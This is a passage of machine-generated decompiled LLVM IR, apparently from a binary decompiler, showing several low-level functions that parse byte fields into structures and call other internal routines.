  %div2 = udiv i8 %v4_176d8, 2
  %tmp6 = urem i8 %div2, 2
  %v1_176e0 = zext i8 %tmp6 to i32
  %v2_176e4 = add i32 %arg2, 16
  %v3_176e4 = inttoptr i32 %v2_176e4 to i32*
  store i32 %v1_176e0, i32* %v3_176e4, align 4
  %v4_176e8 = load i8, i8* %v3_176ac, align 1
  %tmp7 = urem i8 %v4_176e8, 2
  %v1_176ec = zext i8 %tmp7 to i32
  %v2_176f0 = add i32 %arg2, 20
  %v3_176f0 = inttoptr i32 %v2_176f0 to i32*
  store i32 %v1_176ec, i32* %v3_176f0, align 4
  %v2_176f4 = add i32 %tmp, 3
  %v3_176f4 = inttoptr i32 %v2_176f4 to i8*
  %v4_176f4 = load i8, i8* %v3_176f4, align 1
  %tmp8 = icmp slt i8 %v4_176f4, 0
  %v3_176f8 = zext i1 %tmp8 to i32
  %v2_176fc = add i32 %arg2, 24
  %v3_176fc = inttoptr i32 %v2_176fc to i32*
  store i32 %v3_176f8, i32* %v3_176fc, align 4
  %v4_17700 = load i8, i8* %v3_176f4, align 1
  %tmp9 = urem i8 %v4_17700, 16
  %v1_17704 = zext i8 %tmp9 to i32
  %v2_17708 = add i32 %arg2, 28
  %v3_17708 = inttoptr i32 %v2_17708 to i32*
  store i32 %v1_17704, i32* %v3_17708, align 4
  %v2_1770c = add i32 %tmp, 4
  %v3_1770c = inttoptr i32 %v2_1770c to i8*
  %v4_1770c = load i8, i8* %v3_1770c, align 1
  %v5_1770c = zext i8 %v4_1770c to i32
  %v2_17710 = add i32 %tmp, 5
  %v3_17710 = inttoptr i32 %v2_17710 to i8*
  %v4_17710 = load i8, i8* %v3_17710, align 1
  %v5_17710 = zext i8 %v4_17710 to i32
  %v4_17714 = mul nuw nsw i32 %v5_1770c, 256
  %v5_17714 = or i32 %v5_17710, %v4_17714
  %v2_17718 = add i32 %arg2, 32
  %v3_17718 = inttoptr i32 %v2_17718 to i32*
  store i32 %v5_17714, i32* %v3_17718, align 4
  %v2_1771c = add i32 %tmp, 6
  %v3_1771c = inttoptr i32 %v2_1771c to i8*
  %v4_1771c = load i8, i8* %v3_1771c, align 1
  %v5_1771c = zext i8 %v4_1771c to i32
  %v2_17720 = add i32 %tmp, 7
  %v3_17720 = inttoptr i32 %v2_17720 to i8*
  %v4_17720 = load i8, i8* %v3_17720, align 1
  %v5_17720 = zext i8 %v4_17720 to i32
  %v4_17724 = mul nuw nsw i32 %v5_1771c, 256
  %v5_17724 = or i32 %v5_17720, %v4_17724
  %v2_17728 = add i32 %arg2, 36
  %v3_17728 = inttoptr i32 %v2_17728 to i32*
  store i32 %v5_17724, i32* %v3_17728, align 4
  %v2_1772c = add i32 %tmp, 8
  %v3_1772c = inttoptr i32 %v2_1772c to i8*
  %v4_1772c = load i8, i8* %v3_1772c, align 1
  %v5_1772c = zext i8 %v4_1772c to i32
  %v2_17730 = add i32 %tmp, 9
  %v3_17730 = inttoptr i32 %v2_17730 to i8*
  %v4_17730 = load i8, i8* %v3_17730, align 1
  %v5_17730 = zext i8 %v4_17730 to i32
  %v4_17734 = mul nuw nsw i32 %v5_1772c, 256
  %v5_17734 = or i32 %v5_17730, %v4_17734
  %v2_17738 = add i32 %arg2, 40
  %v3_17738 = inttoptr i32 %v2_17738 to i32*
  store i32 %v5_17734, i32* %v3_17738, align 4
  %v2_1773c = add i32 %tmp, 11
  %v3_1773c = inttoptr i32 %v2_1773c to i8*
  %v4_1773c = load i8, i8* %v3_1773c, align 1
  %v5_1773c = zext i8 %v4_1773c to i32
  %v2_17740 = add i32 %tmp, 10
  %v3_17740 = inttoptr i32 %v2_17740 to i8*
  %v4_17740 = load i8, i8* %v3_17740, align 1
  %v5_17740 = zext i8 %v4_17740 to i32
  %v4_17744 = mul nuw nsw i32 %v5_17740, 256
  %v5_17744 = or i32 %v4_17744, %v5_1773c
  %v2_17748 = add i32 %arg2, 44
  %v3_17748 = inttoptr i32 %v2_17748 to i32*
  store i32 %v5_17744, i32* %v3_17748, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 44, { 2, 3, 7, 8, 4, 29, 5, 6, 0, 1, 12, 13, 14, 15, 16, 17, 9, 10, 11, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32 11, { 10, 11, 4, 5, 12, 7, 8, 9, 20, 13, 1, 2, 3, 14, 15, 16, 17, 18, 19, 0, 6 }
  uselistorder i32 40, { 7, 8, 9, 1, 11, 10, 2, 17, 5, 3, 0, 12, 13, 14, 15, 16, 6, 4 }
  uselistorder i32 36, { 19, 20, 22, 23, 24, 25, 7, 4, 6, 21, 0, 1, 8, 2, 5, 28, 9, 10, 11, 12, 13, 3, 14, 15, 26, 27, 16, 17, 18 }
  uselistorder i32 7, { 9, 10, 8, 0, 1, 6, 7, 4, 2, 15, 12, 13, 14, 3, 11, 5 }
  uselistorder i32 28, { 17, 4, 6, 5, 21, 22, 23, 25, 26, 7, 8, 24, 9, 10, 43, 32, 18, 47, 19, 20, 16, 27, 11, 1, 33, 12, 13, 14, 15, 2, 28, 44, 45, 29, 30, 34, 35, 36, 37, 38, 39, 40, 0, 41, 46, 3, 31, 42 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @function_17750(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17750:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17750 = load i32, i32* @r4, align 4
  store i32 %v3_17750, i32* %stack_var_-16, align 4
  %v9_17750 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_17758 = load i32, i32* %arg1, align 4
  store i32 %v2_17758, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_17764 = inttoptr i32 %v2_17758 to i8*
  %v2_17764 = call i32 @function_17a18(i8* %v1_17764)
  store i32 %v2_17764, i32* %r0.global-to-local, align 4
  %v1_17768 = icmp slt i32 %v2_17764, 0
  br i1 %v1_17768, label %dec_label_pc_177a8, label %dec_label_pc_17770

dec_label_pc_17770:                               ; preds = %dec_label_pc_17750
  %v1_17770 = load i32, i32* @r5, align 4
  %v2_17770 = sub i32 %v1_17770, %v2_17764
  %v7_17778 = icmp slt i32 %v2_17770, 4
  br i1 %v7_17778, label %bb, label %dec_label_pc_17780

bb:                                               ; preds = %dec_label_pc_17770
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_177a8

dec_label_pc_17780:                               ; preds = %dec_label_pc_17770
  %v0_17780 = load i32, i32* @r4, align 4
  %v1_17780 = add i32 %v0_17780, 5
  %v2_17780 = inttoptr i32 %v1_17780 to i8*
  %v3_17780 = load i8, i8* %v2_17780, align 1
  %v2_17784 = load i32, i32* @r6, align 4
  %v4_17784 = add i32 %v2_17784, %v2_17764
  %v5_17784 = inttoptr i32 %v4_17784 to i8*
  store i8 %v3_17780, i8* %v5_17784, align 1
  %v0_17788 = load i32, i32* @r4, align 4
  %v1_17788 = add i32 %v0_17788, 4
  %v2_17788 = inttoptr i32 %v1_17788 to i32*
  %v3_17788 = load i32, i32* %v2_17788, align 4
  %v0_1778c = load i32, i32* @r6, align 4
  %v1_1778c = load i32, i32* %r0.global-to-local, align 4
  %v2_1778c = add i32 %v1_1778c, %v0_1778c
  store i32 %v2_1778c, i32* %r2.global-to-local, align 4
  %v1_17790 = trunc i32 %v3_17788 to i8
  %v3_17790 = add i32 %v2_1778c, 1
  %v4_17790 = inttoptr i32 %v3_17790 to i8*
  store i8 %v1_17790, i8* %v4_17790, align 1
  %v0_17794 = load i32, i32* @r4, align 4
  %v1_17794 = add i32 %v0_17794, 9
  %v2_17794 = inttoptr i32 %v1_17794 to i8*
  %v3_17794 = load i8, i8* %v2_17794, align 1
  %v2_17798 = load i32, i32* %r2.global-to-local, align 4
  %v3_17798 = add i32 %v2_17798, 2
  %v4_17798 = inttoptr i32 %v3_17798 to i8*
  store i8 %v3_17794, i8* %v4_17798, align 1
  %v0_1779c = load i32, i32* @r4, align 4
  %v1_1779c = add i32 %v0_1779c, 8
  %v2_1779c = inttoptr i32 %v1_1779c to i32*
  %v3_1779c = load i32, i32* %v2_1779c, align 4
  %v1_177a0 = trunc i32 %v3_1779c to i8
  %v2_177a0 = load i32, i32* %r2.global-to-local, align 4
  %v3_177a0 = add i32 %v2_177a0, 3
  %v4_177a0 = inttoptr i32 %v3_177a0 to i8*
  store i8 %v1_177a0, i8* %v4_177a0, align 1
  %v0_177a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_177a4 = add i32 %v0_177a4, 4
  store i32 %v1_177a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_177a8

dec_label_pc_177a8:                               ; preds = %bb, %dec_label_pc_17750, %dec_label_pc_17780
  %v1_177ac = phi i32 [ -1, %bb ], [ %v2_17764, %dec_label_pc_17750 ], [ %v1_177a4, %dec_label_pc_17780 ]
  %v2_177a8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_177a8, i32* @r4, align 4
  store i32 %v9_17750, i32* @r6, align 4
  ret i32 %v1_177ac

; uselistorder directives
  uselistorder i32 %v2_17764, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 5, 2, 6, 3, 0 }
  uselistorder i32 9, { 13, 14, 15, 17, 18, 1, 26, 16, 12, 2, 19, 0, 20, 21, 3, 4, 10, 7, 8, 9, 22, 23, 24, 25, 5, 6, 11 }
  uselistorder i32 5, { 15, 16, 17, 7, 13, 0, 8, 18, 9, 3, 14, 10, 4, 22, 5, 19, 6, 2, 20, 21, 11, 12, 1 }
  uselistorder label %dec_label_pc_177a8, { 2, 0, 1 }
}

define i32 @function_177b0() local_unnamed_addr {
dec_label_pc_177b0:
  store i32 ptrtoint ([11 x i8]* @global_var_1aa94.706 to i32), i32* @r0, align 4
  %v2_177c8 = call i32 @function_12f1c(i32 ptrtoint ([11 x i8]* @global_var_1aa94.706 to i32))
  ret i32 %v2_177c8

; uselistorder directives
  uselistorder i32 (i32)* @function_12f1c, { 0, 2, 1 }
}

define i32 @function_177e0() local_unnamed_addr {
dec_label_pc_177e0:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_177e0 = load i32, i32* @r4, align 4
  %v6_177e0 = load i32, i32* @r5, align 4
  %v9_177e0 = load i32, i32* @r6, align 4
  %v12_177e0 = load i32, i32* @r7, align 4
  %v15_177e0 = load i32, i32* @r8, align 4
  %v18_177e0 = load i32, i32* @sb, align 4
  %v21_177e0 = load i32, i32* @sl, align 4
  %v24_177e0 = load i32, i32* @fp, align 4
  store i32 %tmp11, i32* @r5, align 4
  store i32 %tmp10, i32* @lr, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 -1, i32* @ip, align 4
  store i32 142044, i32* @r4, align 4
  %v2_17808 = inttoptr i32 %tmp10 to i32*
  store i32 -1, i32* %v2_17808, align 4
  %v0_1780c = load i32, i32* @r0, align 4
  store i32 %v0_1780c, i32* @r6, align 4
  %v0_17810 = load i32, i32* @r1, align 4
  %v0_17814 = load i32, i32* @r2, align 4
  store i32 %v0_17814, i32* @r8, align 4
  %v0_17818 = load i32, i32* @r3, align 4
  store i32 %v0_17818, i32* @fp, align 4
  %v3_1781c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1781c, i32* @r7, align 4
  %tmp = icmp ult i32 %tmp11, 129
  br i1 %tmp, label %.thread, label %dec_label_pc_17828

.thread:                                          ; preds = %dec_label_pc_177e0
  store i32 34, i32* @sb, align 4
  br label %dec_label_pc_179c8

dec_label_pc_17828:                               ; preds = %dec_label_pc_177e0
  %v2_17828 = icmp eq i32 %v0_1780c, 0
  br i1 %v2_17828, label %dec_label_pc_17830, label %dec_label_pc_17850

dec_label_pc_17830:                               ; preds = %dec_label_pc_17828
  %v0_17830 = call i32 @function_177b0()
  store i32 %v0_17830, i32* @r6, align 4
  %v2_17834 = icmp eq i32 %v0_17830, 0
  br i1 %v2_17834, label %dec_label_pc_1783c, label %dec_label_pc_17850

dec_label_pc_1783c:                               ; preds = %dec_label_pc_17830
  store i32 %tmp8, i32* %r2.global-to-local, align 4
  %v2_17840 = inttoptr i32 %tmp8 to i32*
  store i32 0, i32* %v2_17840, align 4
  %v0_17844 = call i32 @function_ce08()
  %v1_17848 = inttoptr i32 %v0_17844 to i32*
  %v2_17848 = load i32, i32* %v1_17848, align 4
  store i32 %v2_17848, i32* @sb, align 4
  br label %dec_label_pc_179c8

dec_label_pc_17850:                               ; preds = %dec_label_pc_17830, %dec_label_pc_17828
  %v1_17870 = phi i32 [ %v0_17830, %dec_label_pc_17830 ], [ %v0_1780c, %dec_label_pc_17828 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1aaa0.709 to i32), i32* @r4, align 4
  %v2_17858 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %tmp7, i32* %ip.global-to-local, align 4
  store i32 %tmp7, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_17870 = add i32 %v1_17870, 8
  %v3_17870 = inttoptr i32 %v2_17870 to i32*
  store i32 48, i32* %v3_17870, align 4
  store i32 %tmp10, i32* %r3.global-to-local, align 4
  %v0_17878 = load i32, i32* @r5, align 4
  %v1_17878 = add i32 %v0_17878, -48
  store i32 %v1_17878, i32* %r1.global-to-local, align 4
  %v0_1787c = load i32, i32* %ip.global-to-local, align 4
  %v1_1787c = add i32 %v0_1787c, 24
  store i32 %v1_1787c, i32* @ip, align 4
  %v0_17880 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_17880, i32* @sb, align 4
  %v0_17884 = load i32, i32* @lr, align 4
  %v1_17884 = add i32 %v0_17884, 32
  store i32 %v1_17884, i32* @sl, align 4
  %v1_17888 = load i32, i32* @r6, align 4
  %v2_17888 = add i32 %v1_17888, 16
  %v3_17888 = inttoptr i32 %v2_17888 to i32*
  store i32 %v1_17878, i32* %v3_17888, align 4
  %v0_1788c = load i32, i32* @r4, align 4
  %v0_17890 = load i32, i32* @ip, align 4
  store i32 %v0_17890, i32* %stack_var_-64, align 4
  %v0_17894 = load i32, i32* %r2.global-to-local, align 4
  %v1_17894 = load i32, i32* %r3.global-to-local, align 4
  %v2_17894 = inttoptr i32 %v1_17894 to i32*
  store i32 %v0_17894, i32* %v2_17894, align 4
  %v0_17898 = load i32, i32* @lr, align 4
  %v1_17898 = load i32, i32* @r6, align 4
  %v2_17898 = add i32 %v1_17898, 4
  %v3_17898 = inttoptr i32 %v2_17898 to i32*
  store i32 %v0_17898, i32* %v3_17898, align 4
  %v2_178c8 = inttoptr i32 %v0_17810 to i8*
  br label %dec_label_pc_1799c

dec_label_pc_178a0:                               ; preds = %dec_label_pc_1799c
  %v3_178a0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_178a0, i32* %r1.global-to-local, align 4
  %v0_178a4 = load i32, i32* @fp, align 4
  %v7_178a4 = icmp eq i32 %v0_178a4, 1
  %v1_178a8 = add i32 %v3_178a0, 4
  store i32 %v1_178a8, i32* @r5, align 4
  %v1_178ac = load i32, i32* @r7, align 4
  %v2_178ac = add i32 %v1_178ac, 4
  %v3_178ac = inttoptr i32 %v2_178ac to i32*
  store i32 %v1_178a8, i32* %v3_178ac, align 4
  br i1 %v7_178a4, label %dec_label_pc_179c8, label %dec_label_pc_178b4

dec_label_pc_178b4:                               ; preds = %dec_label_pc_178a0
  %v0_178b4 = load i32, i32* @fp, align 4
  %v7_178b4 = icmp eq i32 %v0_178b4, 2
  br i1 %v7_178b4, label %dec_label_pc_178c0, label %dec_label_pc_178e4.preheader

dec_label_pc_178e4.preheader:                     ; preds = %dec_label_pc_178b4
  %v1_178b8 = load i32, i32* @r5, align 4
  %v1_178e426 = inttoptr i32 %v1_178b8 to i32*
  %v2_178e427 = load i32, i32* %v1_178e426, align 4
  store i32 %v2_178e427, i32* %r3.global-to-local, align 4
  store i32 %v2_178e427, i32* %r1.global-to-local, align 4
  %v2_178e829 = icmp eq i32 %v2_178e427, 0
  %v1_178f030 = add i32 %v1_178b8, 4
  store i32 %v1_178f030, i32* @r4, align 4
  br i1 %v2_178e829, label %dec_label_pc_1799c, label %dec_label_pc_178d8

dec_label_pc_178c0:                               ; preds = %dec_label_pc_178b4
  %v0_178c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_178c0 = inttoptr i32 %v0_178c0 to i32*
  %v2_178c0 = load i32, i32* %v1_178c0, align 4
  store i32 %v2_178c0, i32* @r1, align 4
  %v3_178c8 = call i32 @function_14410(i8* %v2_178c8, i32 %v2_178c0)
  %v2_178cc = icmp eq i32 %v3_178c8, 0
  br i1 %v2_178cc, label %dec_label_pc_178fc, label %dec_label_pc_1799c

dec_label_pc_178d8:                               ; preds = %dec_label_pc_178e4.preheader, %dec_label_pc_178d8.dec_label_pc_178e4_crit_edge
  %v2_178e431 = phi i32 [ %v2_178e4, %dec_label_pc_178d8.dec_label_pc_178e4_crit_edge ], [ %v2_178e427, %dec_label_pc_178e4.preheader ]
  %v3_178d8 = call i32 @function_f664(i8* %v2_178c8, i32 %v2_178e431)
  %v2_178dc = icmp eq i32 %v3_178d8, 0
  br i1 %v2_178dc, label %dec_label_pc_178fc, label %dec_label_pc_178d8.dec_label_pc_178e4_crit_edge

dec_label_pc_178d8.dec_label_pc_178e4_crit_edge:  ; preds = %dec_label_pc_178d8
  %v0_178e4.pre = load i32, i32* @r4, align 4
  %v1_178e4 = inttoptr i32 %v0_178e4.pre to i32*
  %v2_178e4 = load i32, i32* %v1_178e4, align 4
  store i32 %v2_178e4, i32* %r3.global-to-local, align 4
  store i32 %v2_178e4, i32* %r1.global-to-local, align 4
  %v2_178e8 = icmp eq i32 %v2_178e4, 0
  %v1_178f0 = add i32 %v0_178e4.pre, 4
  store i32 %v1_178f0, i32* @r4, align 4
  br i1 %v2_178e8, label %dec_label_pc_1799c, label %dec_label_pc_178d8

dec_label_pc_178fc:                               ; preds = %dec_label_pc_178d8, %dec_label_pc_178c0
  %v0_178fc = load i32, i32* @r5, align 4
  %v1_178fc = inttoptr i32 %v0_178fc to i32*
  %v2_178fc = load i32, i32* %v1_178fc, align 4
  store i32 %v2_178fc, i32* %r3.global-to-local, align 4
  %v4_178fc = add i32 %v0_178fc, 4
  store i32 %v4_178fc, i32* @r5, align 4
  %v2_17900 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_17900, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v1_17908 = load i32, i32* @r7, align 4
  %v2_17908 = inttoptr i32 %v1_17908 to i32*
  store i32 %v2_178fc, i32* %v2_17908, align 4
  %v0_1790c = load i32, i32* @lr, align 4
  %v1_1790c = load i32, i32* @ip, align 4
  %v2_1790c = add i32 %v1_1790c, 4
  %v3_1790c = inttoptr i32 %v2_1790c to i32*
  store i32 %v0_1790c, i32* %v3_1790c, align 4
  store i32 %tmp7, i32* %r2.global-to-local, align 4
  %v0_17914 = load i32, i32* @r8, align 4
  %v7_17914 = icmp eq i32 %v0_17914, 2
  %v0_17918 = load i32, i32* @r5, align 4
  %v1_17918 = load i32, i32* @r7, align 4
  %v2_17918 = add i32 %v1_17918, 4
  %v3_17918 = inttoptr i32 %v2_17918 to i32*
  store i32 %v0_17918, i32* %v3_17918, align 4
  %v0_1791c = load i32, i32* @ip, align 4
  %v1_1791c = load i32, i32* @r7, align 4
  %v2_1791c = add i32 %v1_1791c, 16
  %v3_1791c = inttoptr i32 %v2_1791c to i32*
  store i32 %v0_1791c, i32* %v3_1791c, align 4
  %v0_17920 = load i32, i32* @sl, align 4
  %v1_17920 = load i32, i32* %r2.global-to-local, align 4
  %v2_17920 = add i32 %v1_17920, 24
  %v3_17920 = inttoptr i32 %v2_17920 to i32*
  store i32 %v0_17920, i32* %v3_17920, align 4
  br i1 %v7_17914, label %dec_label_pc_17928, label %dec_label_pc_17958

dec_label_pc_17928:                               ; preds = %dec_label_pc_178fc
  %v3_17928 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_17928, i32* %r3.global-to-local, align 4
  %v0_1792c = load i32, i32* @r8, align 4
  %v1_17930 = inttoptr i32 %v3_17928 to i32*
  %v2_17930 = load i32, i32* %v1_17930, align 4
  store i32 %v2_17930, i32* %r1.global-to-local, align 4
  %v0_17934 = load i32, i32* @sl, align 4
  store i32 %v0_17934, i32* %r2.global-to-local, align 4
  %v3_17938 = inttoptr i32 %v2_17930 to i8*
  %v4_17938 = call i32 @function_15c1c(i32 %v0_1792c, i8* %v3_17938, i32 %v0_17934)
  %tmp24 = icmp slt i32 %v4_17938, 1
  br i1 %tmp24, label %dec_label_pc_17998, label %dec_label_pc_17944

dec_label_pc_17944:                               ; preds = %dec_label_pc_17928
  %v0_17948 = load i32, i32* @r7, align 4
  %v2_17948 = inttoptr i32 %tmp8 to i32*
  store i32 %v0_17948, i32* %v2_17948, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_17950 = load i32, i32* @r8, align 4
  %v1_17950 = load i32, i32* @r7, align 4
  %v2_17950 = add i32 %v1_17950, 8
  %v3_17950 = inttoptr i32 %v2_17950 to i32*
  store i32 %v0_17950, i32* %v3_17950, align 4
  %v0_17990.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1798c

dec_label_pc_17958:                               ; preds = %dec_label_pc_178fc
  %v0_17958 = load i32, i32* @r8, align 4
  %v7_17958 = icmp eq i32 %v0_17958, 10
  br i1 %v7_17958, label %dec_label_pc_17960, label %dec_label_pc_17998

dec_label_pc_17960:                               ; preds = %dec_label_pc_17958
  %v3_17960 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_17960, i32* %r3.global-to-local, align 4
  %v1_17968 = inttoptr i32 %v3_17960 to i32*
  %v2_17968 = load i32, i32* %v1_17968, align 4
  store i32 %v2_17968, i32* %r1.global-to-local, align 4
  %v0_1796c = load i32, i32* @sl, align 4
  store i32 %v0_1796c, i32* %r2.global-to-local, align 4
  %v3_17970 = inttoptr i32 %v2_17968 to i8*
  %v4_17970 = call i32 @function_15c1c(i32 10, i8* %v3_17970, i32 %v0_1796c)
  %tmp25 = icmp slt i32 %v4_17970, 1
  br i1 %tmp25, label %dec_label_pc_17998, label %dec_label_pc_1797c

dec_label_pc_1797c:                               ; preds = %dec_label_pc_17960
  store i32 %tmp8, i32* @ip, align 4
  %v0_17980 = load i32, i32* @r8, align 4
  %v1_17980 = load i32, i32* @r7, align 4
  %v2_17980 = add i32 %v1_17980, 8
  %v3_17980 = inttoptr i32 %v2_17980 to i32*
  store i32 %v0_17980, i32* %v3_17980, align 4
  %v0_17984 = load i32, i32* @r7, align 4
  %v1_17984 = load i32, i32* @ip, align 4
  %v2_17984 = inttoptr i32 %v1_17984 to i32*
  store i32 %v0_17984, i32* %v2_17984, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1798c

dec_label_pc_1798c:                               ; preds = %dec_label_pc_17944, %dec_label_pc_1797c
  %v0_17990 = phi i32 [ %v0_17990.pre, %dec_label_pc_17944 ], [ 16, %dec_label_pc_1797c ]
  store i32 0, i32* @sb, align 4
  %v1_17990 = load i32, i32* @r7, align 4
  %v2_17990 = add i32 %v1_17990, 12
  %v3_17990 = inttoptr i32 %v2_17990 to i32*
  store i32 %v0_17990, i32* %v3_17990, align 4
  br label %dec_label_pc_179c0

dec_label_pc_17998:                               ; preds = %dec_label_pc_17958, %dec_label_pc_17960, %dec_label_pc_17928
  store i32 2, i32* @sb, align 4
  br label %dec_label_pc_1799c

dec_label_pc_1799c:                               ; preds = %dec_label_pc_178e4.preheader, %dec_label_pc_178d8.dec_label_pc_178e4_crit_edge, %dec_label_pc_178c0, %dec_label_pc_17998, %dec_label_pc_17850
  %v0_1799c = load i32, i32* @r6, align 4
  store i32 %v2_17858, i32* %r1.global-to-local, align 4
  store i32 459270, i32* %r2.global-to-local, align 4
  store i32 %v0_1788c, i32* %r3.global-to-local, align 4
  %v5_179ac = inttoptr i32 %v0_1799c to i32*
  %v6_179ac = call i32 @function_12bc0(i32* %v5_179ac, i32 %v2_17858, i32 459270, i32 %v0_1788c)
  %v2_179b0 = icmp eq i32 %v6_179ac, 0
  br i1 %v2_179b0, label %dec_label_pc_179b8, label %dec_label_pc_178a0

dec_label_pc_179b8:                               ; preds = %dec_label_pc_1799c
  %v0_179b8 = load i32, i32* @fp, align 4
  %v7_179b8 = icmp eq i32 %v0_179b8, 1
  br i1 %v7_179b8, label %dec_label_pc_179c8, label %dec_label_pc_179c0

dec_label_pc_179c0:                               ; preds = %dec_label_pc_179b8, %dec_label_pc_1798c
  %v0_179c0 = load i32, i32* @r6, align 4
  %v1_179c4 = inttoptr i32 %v0_179c0 to i32*
  %v2_179c4 = call i32 @function_12ee8(i32* %v1_179c4)
  br label %dec_label_pc_179c8

dec_label_pc_179c8:                               ; preds = %dec_label_pc_178a0, %.thread, %dec_label_pc_179b8, %dec_label_pc_1783c, %dec_label_pc_179c0
  %v0_179c8 = load i32, i32* @sb, align 4
  store i32 %v3_177e0, i32* @r4, align 4
  store i32 %v6_177e0, i32* @r5, align 4
  store i32 %v9_177e0, i32* @r6, align 4
  store i32 %v12_177e0, i32* @r7, align 4
  store i32 %v15_177e0, i32* @r8, align 4
  store i32 %v18_177e0, i32* @sb, align 4
  store i32 %v21_177e0, i32* @sl, align 4
  store i32 %v24_177e0, i32* @fp, align 4
  ret i32 %v0_179c8

; uselistorder directives
  uselistorder i32 %v2_178e4, { 1, 2, 3, 0 }
  uselistorder i32 %v0_178e4.pre, { 1, 0 }
  uselistorder i32 %v2_17858, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp10, { 2, 0, 1 }
  uselistorder i32 %tmp8, { 3, 2, 1, 0 }
  uselistorder i32 %tmp7, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0, 9, 10 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 0, 5, 7 }
  uselistorder i32 (i32*)* @function_12ee8, { 1, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @function_12bc0, { 2, 0, 1 }
  uselistorder i32 10, { 5, 27, 29, 30, 8, 33, 34, 35, 22, 23, 9, 10, 24, 37, 36, 11, 38, 12, 39, 13, 40, 41, 4, 43, 14, 44, 45, 15, 46, 16, 17, 28, 6, 0, 31, 32, 18, 50, 26, 3, 42, 51, 52, 47, 48, 19, 49, 1, 7, 25, 20, 2, 21 }
  uselistorder i32 (i8*, i32)* @function_f664, { 6, 0, 1, 2, 3, 4, 7, 5 }
  uselistorder i32 (i8*, i32)* @function_14410, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 24, { 37, 41, 43, 44, 0, 48, 7, 8, 1, 50, 45, 9, 46, 47, 10, 42, 49, 2, 61, 62, 63, 11, 38, 39, 51, 12, 40, 13, 34, 35, 14, 36, 15, 16, 17, 3, 18, 19, 20, 21, 4, 64, 22, 23, 24, 26, 25, 27, 28, 29, 5, 6, 52, 53, 54, 55, 56, 57, 58, 59, 65, 30, 66, 31, 32, 33, 60 }
  uselistorder i32 -48, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 48, { 4, 15, 13, 14, 0, 1, 16, 17, 18, 2, 5, 19, 20, 6, 22, 23, 24, 7, 8, 9, 25, 3, 10, 21, 11, 12 }
  uselistorder i32 34, { 5, 6, 7, 8, 1, 2, 0, 4, 10, 3, 11, 9 }
  uselistorder i32 142044, { 1, 59, 0, 60, 30, 61, 2, 3, 4, 62, 7, 8, 6, 5, 9, 10, 11, 12, 63, 13, 64, 14, 15, 65, 16, 66, 67, 68, 69, 70, 71, 17, 54, 50, 48, 47, 49, 51, 52, 53, 46, 55, 41, 43, 42, 40, 39, 44, 45, 36, 35, 38, 37, 34, 33, 32, 31, 56, 57, 58, 72, 18, 73, 74, 19, 20, 75, 21, 22, 28, 27, 26, 25, 24, 23, 76, 29, 77 }
  uselistorder i32* @fp, { 37, 38, 39, 40, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 0, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 2, 3, 59, 60, 61, 62, 73, 74, 75, 1, 76, 77, 78, 79, 80, 41, 42, 43, 44, 45, 46, 47, 48, 4, 104, 106, 105, 107, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 108, 109, 110, 111, 112, 113, 114, 115, 116, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 81, 82, 102, 103, 117, 118, 119, 83, 84, 85, 99, 100, 101, 15, 16, 17 }
